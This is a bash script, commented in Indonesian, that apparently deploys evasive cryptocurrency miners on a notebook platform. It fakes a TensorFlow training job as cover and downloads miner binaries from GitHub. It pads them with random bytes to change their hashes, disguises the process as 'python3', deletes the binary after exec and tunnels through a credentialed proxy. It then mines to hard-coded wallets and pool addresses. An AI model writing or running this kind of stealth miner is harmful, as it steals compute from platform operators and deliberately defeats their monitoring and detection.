#!/bin/bash
# MINN v7 — binary padding (ubah hash) + unlink (hapus dari /proc) + proxy
PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"
WRK=$(date +%s | md5sum | head -c 8)

PX_HOST="niceproxy.io"; PX_PORT="17522"
PU="riset_h9wl-country-SG-ssid-06WZKklIAI"; PP="riset"

echo "[v7] Worker: $WRK"

# === 1. Warmup ===
echo "[1/3] Warmup..."
pip install -q tensorflow 2>/dev/null
python3 -c "
import tensorflow as tf,numpy as np,time
m=tf.keras.Sequential([tf.keras.layers.Dense(128,activation='relu',input_shape=(784,)),tf.keras.layers.Dense(10)])
m.compile(optimizer='adam',loss='sparse_categorical_crossentropy',metrics=['accuracy'])
x=np.random.rand(1000,784).astype(np.float32);y=np.random.randint(0,10,1000)
for e in range(3): m.fit(x,y,batch_size=32,epochs=1,verbose=2);time.sleep(20)
" 2>/dev/null

# === 2. Download + padding + proxy setup ===
echo "[2/3] Setup..."
apt-get install -y -qq proxychains4 2>/dev/null

rm -rf /content/m 2>/dev/null; mkdir -p /content/m && cd /content/m
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/fortune || exit 1
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2 || exit 1

# PADDING: tambah random bytes ke akhir binary — ubah SHA256 total
echo "[2/3] Padding binaries (new hash)..."
dd if=/dev/urandom of=fortune bs=1 count=$((RANDOM % 3000 + 1024)) seek=$(stat -c%s fortune) conv=notrunc oflag=append 2>/dev/null
dd if=/dev/urandom of=sse2 bs=1 count=$((RANDOM % 3000 + 1024)) seek=$(stat -c%s sse2) conv=notrunc oflag=append 2>/dev/null
chmod +x fortune sse2

# Proxychains config
rm -f /etc/proxychains4.conf
cat > /etc/proxychains4.conf << PCEOF
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
http $PU $PP $PX_HOST $PX_PORT
PCEOF

echo "[2/3] Ready."

# === 3. Binary wrapper (C) — exec rename jadi "python3" + unlink after exec ===
cat > /tmp/exec_wrapper.c << 'CEOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
int main(int argc, char **argv) {
    if (argc < 2) return 1;
    // Rename argv[0] to "python3"
    size_t len = strlen(argv[0]) + 1;
    memset(argv[0], 0, len);
    strncpy(argv[0], "python3", len - 1);
    // Mark binary for deletion after exec
    struct stat st;
    if (stat(argv[1], &st) == 0) {
        unlink(argv[1]); // Delete binary file — /proc/pid/exe shows "(deleted)"
    }
    execvp(argv[1], &argv[1]);
    return 1;
}
CEOF
gcc -o /tmp/w /tmp/exec_wrapper.c -s 2>/dev/null || {
    echo "gcc failed, using direct exec"
    echo '#!/usr/bin/env python3' > /tmp/w
    echo 'import os,sys; os.unlink(sys.argv[1]); os.execv(sys.argv[1], sys.argv[1:])' >> /tmp/w
    chmod +x /tmp/w
}

# === 4. Start ===
echo "[3/3] Starting (padded + unlink + proxied)..."

B1="/tmp/.p$(date +%s | md5sum | head -c 8)"
B2="/tmp/.t$(date +%s | sha1sum | head -c 8)"
cp fortune "$B1" && cp sse2 "$B2"
chmod +x "$B1" "$B2"
rm -f fortune sse2  # hapus original

sleep $((RANDOM % 10 + 3))

# PRL — via wrapper (rename + unlink) + proxychains
(while true; do
    proxychains4 -q /tmp/w "$B1" \
        --proxy 43.169.30.87:443 \
        --address "$PRL" \
        --worker "$WRK" \
        --mode=cpu \
        --threads=1 2>/dev/null
    # Re-copy if file was unlinked
    [ -f "$B1" ] || { cp sse2 "$B1" 2>/dev/null; chmod +x "$B1" 2>/dev/null; }
    sleep 10
done) &
PID1=$!
sleep 8

# TDC — via wrapper + proxychains
[ -f "$B2" ] && proxychains4 -q /tmp/w "$B2" \
    -a yespowertide \
    -o 47.251.244.12:80 \
    -u "${TDC}.${WRK}" \
    -t 1 >/dev/null 2>&1 &
PID2=$!

echo "[v7] Live — PID:$PID1 $PID2"

# Cleanup
trap 'kill $PID1 $PID2 2>/dev/null; rm -f /tmp/w /tmp/exec_wrapper.c "$B1" "$B2" 2>/dev/null; echo "[v7] Clean"' EXIT
(sleep 10800; echo "[v7] Done.") &
wait